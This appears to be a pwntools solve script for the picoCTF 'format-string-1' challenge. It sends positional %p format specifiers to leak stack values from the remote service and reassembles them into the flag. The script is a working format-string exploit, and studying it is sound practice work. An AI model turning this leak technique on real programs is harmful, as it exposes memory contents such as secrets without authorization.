#!/usr/bin/env python3
from pwn import *

p = process("./format-string-1")
p = remote("mimas.picoctf.net", 61647)

payload = b''
for i in range(14, 20):
    payload += f'%{i}$p'.encode()
p.sendlineafter(b'you:\n', payload)

p.recvuntil(b'order: ')

stack_data = p.recvline().strip().split(b'0x')

flag = b''
for i in range(1, len(stack_data)):
    print(stack_data[i])
    data = int((b'0x' + stack_data[i]).decode(), 16)
    flag += p64(data)

print(flag)

p.interactive()